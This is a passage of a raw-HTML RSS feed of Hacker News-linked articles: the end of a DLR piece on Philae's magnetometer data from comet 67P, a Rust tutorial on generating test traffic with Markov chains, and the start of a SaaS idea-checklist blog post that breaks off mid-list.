			This com¬≠pi¬≠la¬≠tion shows the mea¬≠sure¬≠ments record¬≠ed by Phi¬≠lae's ROMAP in¬≠stru¬≠ment ‚Äì a mag¬≠ne¬≠tome¬≠ter with a boom ‚Äì dur¬≠ing the sec¬≠ond touch¬≠down on Comet 67P/Churyu¬≠mov-Gerasi¬≠menko on 12 Novem¬≠ber 2014, along¬≠side OSIRIS im¬≠ages tak¬≠en lat¬≠er, which show ev¬≠i¬≠dence of the key mo¬≠ments of Phi¬≠lae's con¬≠tacts with the sur¬≠face (and the re¬≠con¬≠struct¬≠ed po¬≠si¬≠tions of Phi¬≠lae pro¬≠ject¬≠ed on¬≠to them). Sig¬≠na¬≠tures rel¬≠a¬≠tive to the lan¬≠der were record¬≠ed in the mag¬≠ne¬≠tome¬≠ter da¬≠ta from the ROMAP boom when the boom phys¬≠i¬≠cal¬≠ly moved by hit¬≠ting an ob¬≠sta¬≠cle on the sur¬≠face, bend¬≠ing slight¬≠ly (the boom pro¬≠trudes 48 cen¬≠time¬≠tres from the lan¬≠der). This pro¬≠duced a char¬≠ac¬≠ter¬≠is¬≠tic set of 'peaks' in the ROMAP da¬≠ta, which pro¬≠vid¬≠ed an es¬≠ti¬≠mate of the du¬≠ra¬≠tion of Phi¬≠lae's pen¬≠e¬≠tra¬≠tion of the ice. The da¬≠ta could al¬≠so be used to es¬≠ti¬≠mate the ac¬≠cel¬≠er¬≠a¬≠tion of Phi¬≠lae dur¬≠ing these con¬≠tacts. They show that Phi¬≠lae spent al¬≠most two full min¬≠utes at touch¬≠down point two and made con¬≠tact with the sur¬≠face sev¬≠er¬≠al times. Phi¬≠lae first moved down¬≠wards, slid¬≠ing down the edge of a cliff (1) and ro¬≠tat¬≠ing ver¬≠ti¬≠cal¬≠ly like a wind¬≠mill to pass be¬≠tween two boul¬≠ders (2), ex¬≠pos¬≠ing lay¬≠ers of ice in the crevices with its spi¬≠der legs. The 'wind¬≠mill ac¬≠tion' cre¬≠at¬≠ed a wall of dust through which Phi¬≠lae pushed it¬≠self. The gap is ap¬≠prox¬≠i¬≠mate¬≠ly 2.5 me¬≠tres long, curved, and has a width of 1‚Äì1.5 me¬≠tres. Then Phi¬≠lae pushed a 25-cen¬≠time¬≠tre im¬≠print of the top of the lan¬≠der in¬≠to the sur¬≠face of the comet (3) ‚Äì a hole cre¬≠at¬≠ed by the top of the SD2 (Sam¬≠pling, Drilling and Dis¬≠tri¬≠bu¬≠tion De¬≠vice) tow¬≠er. Phi¬≠lae then rose out of the crevice, was pressed down again by an over¬≠hang (4a), its up¬≠per sur¬≠face cre¬≠at¬≠ing an im¬≠pres¬≠sion in the dust that pressed the 'eye' in¬≠to the skull (4b).
			
				</p>
			
		</div>
	</div>
</div>


<div>
	




<picture>
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philae-s-magnetometer-measurements-on-td2.jpg?__blob=normal&amp;v=4__ifc640w" media="(max-width: 640px)">
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philae-s-magnetometer-measurements-on-td2.jpg?__blob=normal&amp;v=4__ifc1024w" media="(max-width: 1024px)">
	<img src="https://www.dlr.de/content/en/images/2020/4/philae-s-magnetometer-measurements-on-td2.jpg?__blob=normal&amp;v=4__ifc1920w" alt="Philae‚Äôs magnetometer measurements on TD2">
</picture>
	
	<div>
		<p><span>Phi¬≠lae‚Äôs mag¬≠ne¬≠tome¬≠ter mea¬≠sure¬≠ments on TD2</span></p>
		<p><span>Image</span>
		7/11,
		<span>Credit: </span>	





	
	
		ESA/Rosetta/Philae/ROMAP
	



	</p></div>
	<div>
		<div>
			<h3>Philae‚Äôs magnetometer measurements on TD2</h3><p>
			The high¬≠ly sen¬≠si¬≠tive mag¬≠ne¬≠tome¬≠ter ROMAP built un¬≠der the di¬≠rec¬≠tion of the Tech¬≠ni¬≠cal Uni¬≠ver¬≠si¬≠ty of Braun¬≠schweig for the Roset¬≠ta mis¬≠sion was switched on dur¬≠ing Phi¬≠lae's de¬≠scent from the or¬≠biter to the comet's sur¬≠face. It con¬≠tin¬≠u¬≠ous¬≠ly record¬≠ed the (very weak) mag¬≠net¬≠ic field da¬≠ta in three ax¬≠i¬≠al di¬≠rec¬≠tions (mag¬≠net¬≠ic field com¬≠po¬≠nent in x-di¬≠rec¬≠tion = blue, y = or¬≠ange, z = grey) with a mea¬≠sur¬≠ing rod al¬≠most half a me¬≠tre long from the first con¬≠tact with the sur¬≠face un¬≠til the probe came to a fi¬≠nal stand¬≠still. The scale on the left in¬≠di¬≠cates the mag¬≠ni¬≠tude of the mag¬≠net¬≠ic flux den¬≠si¬≠ty in the unit nan¬≠otes¬≠la. For com¬≠par¬≠i¬≠son: the in¬≠ter¬≠stel¬≠lar medi¬≠um has a mag¬≠net¬≠ic field strength of up to 10 nan¬≠otes¬≠la, while the Earth's mag¬≠net¬≠ic field has about five thou¬≠sand times this val¬≠ue in Ger¬≠many. From the mea¬≠sure¬≠ments, it was pos¬≠si¬≠ble to re¬≠con¬≠struct the course of the bumpy on¬≠ward flight of Phi¬≠lae down to the sec¬≠ond af¬≠ter the first touch¬≠down. Now the long-sought ‚Äòtouch¬≠down point 2‚Äô (TD2) has al¬≠so be ‚Ä¶</p></div></div></div></div></div></div></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dlr.de/content/en/articles/news/2020/04/20201028_4_5-billion-year-old-ice-on-comet-fluffier-than-cappuccino-froth.html">https://www.dlr.de/content/en/articles/news/2020/04/20201028_4_5-billion-year-old-ice-on-comet-fluffier-than-cappuccino-froth.html</a></em></p>]]>
            </description>
            <link>https://www.dlr.de/content/en/articles/news/2020/04/20201028_4_5-billion-year-old-ice-on-comet-fluffier-than-cappuccino-froth.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24925843</guid>
            <pubDate>Thu, 29 Oct 2020 00:41:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generating Realistic Test Traffic Using Markov Chains]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24925655">thread link</a>) | @tinrab
<br/>
October 28, 2020 | https://outcrawl.com/markov-chains-test-traffic/ | <a href="https://web.archive.org/web/*/https://outcrawl.com/markov-chains-test-traffic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This article shows how you can generate realistic user traffic for testing purposes by sampling requests in production and generating fake ones using <a href="https://en.wikipedia.org/wiki/Markov_chain">Markov chains</a>.</p>
<p>Example code is available on <a href="https://github.com/tinrab/rusty-markov-traffic">GitHub</a>.</p>
<h2 id="Markov-chains">Markov chains<a href="#Markov-chains" aria-label="Markov chains permalink"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 4 24 16"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2>
<p>A Markov chain is a stochastic model telling us probability of an event based on previously observed events.
Probability of next event <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">X_{n+1}</annotation></semantics></math></span></span> is determined by last known event <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">‚à£</mi><msub><mi>X</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(X_{n+1}|X_{n})</annotation></semantics></math></span></span> or previous <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span></span> events, which gives us a Markov chain of order <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span></span>:</p>
<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>n</mi></msub><mo>=</mo><msub><mi>x</mi><mi>n</mi></msub><mi mathvariant="normal">‚à£</mi><msub><mi>X</mi><mrow><mi>n</mi><mo>‚àí</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>x</mi><mrow><mi>n</mi><mo>‚àí</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>X</mi><mrow><mi>n</mi><mo>‚àí</mo><mi>m</mi></mrow></msub><mo>=</mo><msub><mi>x</mi><mrow><mi>n</mi><mo>‚àí</mo><mi>m</mi></mrow></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>n</mi><mo>&gt;</mo><mi>m</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">P(X_{n}=x_{n}|X_{n-1}=x_{n-1},...,X_{n-m}=x_{n-m}), n\gt m.</annotation></semantics></math></span></span></span></p><p>We can track actual user behaviour and build a model by counting events and calculating weighted probabilities for each event based on events preceding them.</p>
<p>For example, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span></span> users finished writing a blog post.
<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>9</mn></mrow><annotation encoding="application/x-tex">9</annotation></semantics></math></span></span> users later published it and one of them trashed it.
This gives us probabilities <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>P</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>P</mi><mi>u</mi><mi>b</mi><mi>l</mi><mi>i</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">‚à£</mi><mi>P</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>F</mi><mi>i</mi><mi>n</mi><mi>i</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0.9</mn></mrow><annotation encoding="application/x-tex">P(PostPublished|PostFinished)=0.9</annotation></semantics></math></span></span> and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>P</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>T</mi><mi>r</mi><mi>a</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">‚à£</mi><mi>P</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi>F</mi><mi>i</mi><mi>n</mi><mi>i</mi><mi>s</mi><mi>h</mi><mi>e</mi><mi>d</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0.1</mn></mrow><annotation encoding="application/x-tex">P(PostTrashed|PostFinished)=0.1</annotation></semantics></math></span></span>.
We can then selected a random event with <a href="https://en.wikipedia.org/wiki/Fitness_proportionate_selection">roulette wheel selection</a>.</p>
<p>This is useful for stress or smoke testing when you need some fake traffic that resembles real users.</p>
<h2 id="Implementation">Implementation<a href="#Implementation" aria-label="Implementation permalink"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 4 24 16"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2>
<p>Let's declare a struct for a Markov chain.
Map <code>occurrences</code> will hold event counts <code>BTreeMap&lt;T, usize&gt;</code> for any previous series of events <code>Vec&lt;T&gt;</code>.</p>
<div data-language="rust"><pre><code><span>#[derive(Clone)]</span>
<span>pub</span> <span>struct</span> MarkovChain<span>&lt;</span>T<span>&gt;</span>
<span>where</span>
    T<span>:</span> Clone <span>+</span> Ord<span>,</span>
<span>{</span>
    order<span>:</span> <span>usize</span><span>,</span>
    occurrences<span>:</span> BTreeMap<span>&lt;</span>Vec<span>&lt;</span>T<span>&gt;</span><span>,</span> BTreeMap<span>&lt;</span>T<span>,</span> <span>usize</span><span>&gt;&gt;</span><span>,</span>
    memory<span>:</span> Vec<span>&lt;</span>T<span>&gt;</span><span>,</span>
    rng<span>:</span> ThreadRng<span>,</span>
<span>}</span></code></pre></div>
<p>To build a model we have to go through all observed events and count the number of times <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span></span>-th event occured after all <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>&gt;</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">n&gt;m</annotation></semantics></math></span></span> events.
We also track last known <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span></span> events inside the <code>memory</code> vector, which will be used to generate the next event.</p>
<div data-language="rust"><pre><code><span>impl</span><span>&lt;</span>T<span>&gt;</span> MarkovChain<span>&lt;</span>T<span>&gt;</span>
<span>where</span>
    T<span>:</span> Clone <span>+</span> Ord<span>,</span>
<span>{</span>
    <span>pub</span> <span>fn</span> <span>update</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> events<span>:</span> <span>&amp;</span><span>[</span>T<span>]</span><span>)</span> <span>{</span>
        <span>let</span> events<span>:</span> Vec<span>&lt;</span>_<span>&gt;</span> <span>=</span> events<span>.</span><span>to_vec</span><span>(</span><span>)</span><span>;</span>
        <span>for</span> history <span>in</span> events<span>.</span><span>windows</span><span>(</span><span>self</span><span>.</span>order <span>+</span> <span>1</span><span>)</span> <span>{</span>
            
            <span>let</span> previous <span>=</span> history<span>[</span><span>0</span><span>..</span><span>self</span><span>.</span>order<span>]</span><span>.</span><span>to_vec</span><span>(</span><span>)</span><span>;</span>
            <span>let</span> current <span>=</span> history<span>.</span><span>last</span><span>(</span><span>)</span><span>.</span><span>cloned</span><span>(</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span>
            
            <span>self</span><span>.</span>occurrences
                <span>.</span><span>entry</span><span>(</span>previous<span>)</span>
                <span>.</span><span>or_default</span><span>(</span><span>)</span>
                <span>.</span><span>entry</span><span>(</span>current<span>)</span>
                <span>.</span><span>and_modify</span><span>(</span><span><span>|</span>count<span>|</span></span> <span>*</span>count <span>+=</span> <span>1</span><span>)</span>
                <span>.</span><span>or_insert</span><span>(</span><span>1</span><span>)</span><span>;</span>
        <span>}</span>
        
        <span>self</span><span>.</span>memory<span>.</span><span>reserve</span><span>(</span><span>self</span><span>.</span>order<span>)</span><span>;</span>
        <span>for</span> event <span>in</span> events<span>.</span><span>into_iter</span><span>(</span><span>)</span><span>.</span><span>rev</span><span>(</span><span>)</span><span>.</span><span>take</span><span>(</span><span>self</span><span>.</span>order<span>)</span> <span>{</span>
            <span>self</span><span>.</span>memory<span>.</span><span>insert</span><span>(</span><span>0</span><span>,</span> event<span>)</span><span>;</span>
        <span>}</span>
        <span>self</span><span>.</span>memory<span>.</span><span>truncate</span><span>(</span><span>self</span><span>.</span>order<span>)</span><span>;</span>
    <span>}</span>
    </code></pre></div>
<p>The <code>generate_from</code> function takes in the memory, finds occurrences and chooses an event from those.
We use <a href="https://docs.rs/rand/0.7.3/rand/seq/trait.SliceRandom.html#tymethod.choose_weighted">choose_weighted</a> function provided by the <a href="https://crates.io/crates/rand">rand</a> crate.</p>
<div data-language="rust"><pre><code><span>pub</span> <span>fn</span> <span>generate_from</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> memory<span>:</span> <span>&amp;</span><span>[</span>T<span>]</span><span>)</span> <span>-&gt;</span> Option<span>&lt;</span>T<span>&gt;</span> <span>{</span>
    <span>assert_eq!</span><span>(</span>memory<span>.</span><span>len</span><span>(</span><span>)</span><span>,</span> <span>self</span><span>.</span>order<span>,</span> <span>"invalid memory size"</span><span>)</span><span>;</span>
    <span>if</span> <span>let</span> Some<span>(</span>occurrences<span>)</span> <span>=</span> <span>self</span><span>.</span>occurrences<span>.</span><span>get</span><span>(</span>memory<span>)</span> <span>{</span>
        
        
        <span>let</span> occurrence_counts<span>:</span> Vec<span>&lt;</span>_<span>&gt;</span> <span>=</span> occurrences
            <span>.</span><span>iter</span><span>(</span><span>)</span>
            <span>.</span><span>map</span><span>(</span><span><span>|</span>(event, count)<span>|</span></span> <span>(</span>event<span>.</span><span>clone</span><span>(</span><span>)</span><span>,</span> <span>*</span>count<span>)</span><span>)</span>
            <span>.</span><span>collect</span><span>(</span><span>)</span><span>;</span>
        
        occurrence_counts
            <span>.</span><span>choose_weighted</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>.</span>rng<span>,</span> <span><span>|</span>(_, count)<span>|</span></span> <span>*</span>count<span>)</span>
            <span>.</span><span>map</span><span>(</span><span><span>|</span>(event, _)<span>|</span></span> event<span>)</span>
            <span>.</span><span>ok</span><span>(</span><span>)</span>
            <span>.</span><span>cloned</span><span>(</span><span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
        
        None
    <span>}</span>
<span>}</span></code></pre></div>
<p>After generating a new event, we update the internal memory.
Next events will then be calculated from the most recent memory.</p>
<div data-language="rust"><pre><code><span>pub</span> <span>fn</span> <span>generate</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> update_memory<span>:</span> <span>bool</span><span>)</span> <span>-&gt;</span> Option<span>&lt;</span>T<span>&gt;</span> <span>{</span>
    <span>let</span> last_memory <span>=</span> <span>self</span><span>.</span>memory<span>.</span><span>clone</span><span>(</span><span>)</span><span>;</span>
    <span>if</span> <span>let</span> Some<span>(</span>next<span>)</span> <span>=</span> <span>self</span><span>.</span><span>generate_from</span><span>(</span><span>&amp;</span>last_memory<span>)</span> <span>{</span>
        <span>if</span> update_memory <span>{</span>
            
            <span>self</span><span>.</span>memory<span>.</span><span>insert</span><span>(</span><span>0</span><span>,</span> next<span>.</span><span>clone</span><span>(</span><span>)</span><span>)</span><span>;</span>
            <span>self</span><span>.</span>memory<span>.</span><span>truncate</span><span>(</span><span>self</span><span>.</span>order<span>)</span><span>;</span>
        <span>}</span>
        Some<span>(</span>next<span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
        None
    <span>}</span>
<span>}</span></code></pre></div>
<p>We can also write an iterator that returns generated events.</p>
<div data-language="rust"><pre><code><span>pub</span> <span>struct</span> MarkovChainIter<span>&lt;</span><span>'a</span><span>,</span> T<span>&gt;</span>
<span>where</span>
    T<span>:</span> Clone <span>+</span> Ord<span>,</span>
<span>{</span>
    chain<span>:</span> <span>&amp;</span><span>'a</span> <span>mut</span> MarkovChain<span>&lt;</span>T<span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>'a</span><span>,</span> T<span>&gt;</span> Iterator <span>for</span> MarkovChainIter<span>&lt;</span><span>'a</span><span>,</span> T<span>&gt;</span>
<span>where</span>
    T<span>:</span> Clone <span>+</span> Ord<span>,</span>
<span>{</span>
    <span>type</span> Item <span>=</span> T<span>;</span>

    <span>fn</span> <span>next</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>)</span> <span>-&gt;</span> Option<span>&lt;</span><span>Self</span><span>::</span>Item<span>&gt;</span> <span>{</span>
        <span>self</span><span>.</span>chain<span>.</span><span>generate</span><span>(</span><span>true</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>impl</span><span>&lt;</span>T<span>&gt;</span> MarkovChain<span>&lt;</span>T<span>&gt;</span>
<span>where</span>
    T<span>:</span> Clone <span>+</span> Ord<span>,</span>
<span>{</span>
    <span>pub</span> <span>fn</span> <span>iter</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>)</span> <span>-&gt;</span> MarkovChainIter<span>&lt;</span>T<span>&gt;</span> <span>{</span>
        MarkovChainIter <span>{</span> chain<span>:</span> <span>self</span> <span>}</span>
    <span>}</span>
    
<span>}</span></code></pre></div>
<h2 id="Example">Example<a href="#Example" aria-label="Example permalink"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 4 24 16"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2>
<p>To see it in action, we declare an enum of all possible actions.
Of course, these can be way more complicated in the real world use-case.</p>
<div data-language="rust"><pre><code><span>#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]</span>
<span>enum</span> UserAction <span>{</span>
    SignIn<span>,</span>
    SignOut<span>,</span>
    CreateTodo<span>,</span>
    DeleteTodo<span>,</span>
    ListTodos<span>,</span>
<span>}</span></code></pre></div>
<p>We build a chain from a sample of actions.</p>
<div data-language="rust"><pre><code><span>let</span> <span>mut</span> chain <span>=</span> MarkovChain<span>::</span><span>new</span><span>(</span><span>1</span><span>)</span><span>;</span>
<span>let</span> actions <span>=</span> <span>vec!</span><span>[</span>
    UserAction<span>::</span>SignIn<span>,</span>
    UserAction<span>::</span>ListTodos<span>,</span>
    UserAction<span>::</span>CreateTodo<span>,</span>
    UserAction<span>::</span>CreateTodo<span>,</span>
    UserAction<span>::</span>SignOut<span>,</span>
    UserAction<span>::</span>SignIn<span>,</span>
    UserAction<span>::</span>ListTodos<span>,</span>
    UserAction<span>::</span>DeleteTodo<span>,</span>
    UserAction<span>::</span>DeleteTodo<span>,</span>
    UserAction<span>::</span>CreateTodo<span>,</span>
    UserAction<span>::</span>CreateTodo<span>,</span>
    UserAction<span>::</span>SignOut<span>,</span>
    UserAction<span>::</span>SignIn<span>,</span>
    UserAction<span>::</span>ListTodos<span>,</span>
    UserAction<span>::</span>CreateTodo<span>,</span>
    UserAction<span>::</span>DeleteTodo<span>,</span>
    UserAction<span>::</span>CreateTodo<span>,</span>
    UserAction<span>::</span>DeleteTodo<span>,</span>
    UserAction<span>::</span>ListTodos<span>,</span>
    UserAction<span>::</span>DeleteTodo<span>,</span>
    UserAction<span>::</span>SignOut<span>,</span>
<span>]</span><span>;</span>
chain<span>.</span><span>update</span><span>(</span><span>&amp;</span>actions<span>)</span><span>;</span></code></pre></div>
<p>Then generate a few actions.</p>
<div data-language="rust"><pre><code><span>for</span> action <span>in</span> chain<span>.</span><span>iter</span><span>(</span><span>)</span><span>.</span><span>take</span><span>(</span><span>16</span><span>)</span> <span>{</span>
    <span>if</span> action <span>==</span> UserAction<span>::</span>SignIn <span>{</span>
        <span>println!</span><span>(</span><span>"## New session ##"</span><span>)</span><span>;</span>
    <span>}</span>
    <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> action<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>Which gives us the following output.</p>
<div data-language="bash"><pre><code><span><span data-user="root" data-host="localhost"></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span>cargo run --example traffic

SignIn
ListTodos
DeleteTodo
SignOut

SignIn
ListTodos
DeleteTodo
DeleteTodo
CreateTodo
SignOut

SignIn
ListTodos
CreateTodo
CreateTodo
CreateTodo
DeleteTodo</code></pre></div>
<p>Notice how after each <code>SignIn</code> there's a <code>ListTodos</code>, which means <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>L</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>T</mi><mi>o</mi><mi>d</mi><mi>o</mi><mi>s</mi><mi mathvariant="normal">‚à£</mi><mi>S</mi><mi>i</mi><mi>g</mi><mi>n</mi><mi>I</mi><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">P(ListTodos|SignIn)=1</annotation></semantics></math></span></span>.
Built model can represent inherent rules of our application.
Some series of actions will not be generated, those having probability <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span>, which is a lot better than uniformly generated random data.</p>
<p>Some combination of actions might not be possible, because they'd break business rules.
Those can be filtered out, or left in to test invalid requests.</p>
<h2 id="Conclusion">Conclusion<a href="#Conclusion" aria-label="Conclusion permalink"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 4 24 16"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2>
<p>We can do much more with this.
This was only a brief introduction to a handy tool that can be used to generate some fake requests.</p>
<p>Sample code is available on <a href="https://github.com/tinrab/rusty-markov-traffic">GitHub</a>.</p></div></div>]]>
            </description>
            <link>https://outcrawl.com/markov-chains-test-traffic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24925655</guid>
            <pubDate>Thu, 29 Oct 2020 00:10:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The idea DOES matter: How I pre-validate my SaaS startup ideas with a checklist]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24925642">thread link</a>) | @alfarez
<br/>
October 28, 2020 | https://farez.me/how-to-pick-a-saas-startup-idea-a-pre-validation-checklist/ | <a href="https://web.archive.org/web/*/https://farez.me/how-to-pick-a-saas-startup-idea-a-pre-validation-checklist/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://farez.me/content/images/size/w300/2020/10/cover.jpg 300w,
                            https://farez.me/content/images/size/w600/2020/10/cover.jpg 600w,
                            https://farez.me/content/images/size/w1000/2020/10/cover.jpg 1000w,
                            https://farez.me/content/images/size/w2000/2020/10/cover.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://farez.me/content/images/size/w2000/2020/10/cover.jpg" alt="How I evaluate my SaaS startup ideas with a pre-validation checklist">
            </figure>

            <section>
                <div>
                    <p>For founders, this question comes up a lot:</p><blockquote>‚ÄúI have too many startup ideas. I don‚Äôt know which idea to focus on.‚Äù</blockquote><p>It certainly did for me. </p><p>I have been building SaaS products for the last few years, with bad to mediocre results. Each one taught me something new. Each one revealed one or two factors about the idea that I wish I knew BEFORE working on it.</p><p>For example, if there is a HUGE population with the problem I'm solving, then there's a better chance of me surviving despite incumbents and competitors. Larger pie, more slices to go round.</p><p>If I had known how to evaluate these ideas beforehand, I would have saved a lot of time. It won't be a guarantee of success, but it would have helped increase my odds.</p><p>I wanted to know what else I should know before starting work on an idea, so I researched articles, podcasts and videos with successful founders to find out how they evaluate ideas.</p><p>The result is a <strong>30-point checklist</strong>, curated from over 40 founders, that I want to share with you below. </p><p>Having a list makes it easy, and even fun, to evaluate your ideas in a structured and repeatable way. Think of it as <strong>due diligence</strong> you're doing before investing your time in your idea.</p><h2 id="but-ideas-don-t-matter-execution-does-">"But ideas don't matter. Execution does!"</h2><p>The intention of this advice is good, but, I feel this is misleading.</p><p>Given two ideas, executing on the one that has a better chance of succeeding will yield better results. Executing on a bad idea wastes time, money, and motivation.</p><p>Would you not want to know if an idea is a "good idea" before you spend lots of time and money trying to validate it?</p><p>If you think evaluating an idea before investing time and money in it isn't practical, then tell that to angel investors. They have to - they can't afford to give away money based on hunches. In their world, it's called due diligence.</p><blockquote>"Ideas mean everything and nothing at the same time. They mean everything, because you can 10x your odds of success by simply picking a better one. They mean nothing, because with bad execution you'll achieve nothing, no matter how good the idea." ‚Äî Alex West, <a href="http://cyberleads.co/">cyberleads.co</a></blockquote><h2 id="the-saas-idea-evaluation-checklist">The SaaS idea evaluation checklist</h2><p>So here's the list I'm using. I have grouped them into 3 groups:</p><ul><li>Must-haves: Don't even start without having all of these.</li><li>Should-haves: The more you have of these, the better your chances.</li><li>Nice-to-haves: Not essential, but really helps if you do have them.</li></ul><h3 id="must-haves">Must-haves</h3><p>1. <strong>Solves a very specific problem</strong>. What's the specific problem you are aiming to solve?</p><p>2. <strong>Targets a very specific niche</strong>. Which specific group of people has that problem?</p><p>3. <strong>Has a large enough market</strong>. How big is this market? Is it enough to meet your business goal? A large market also means there's room for competitors.</p><p>4. <strong>Will generate profit</strong>. How much will it cost to run this business, and will you 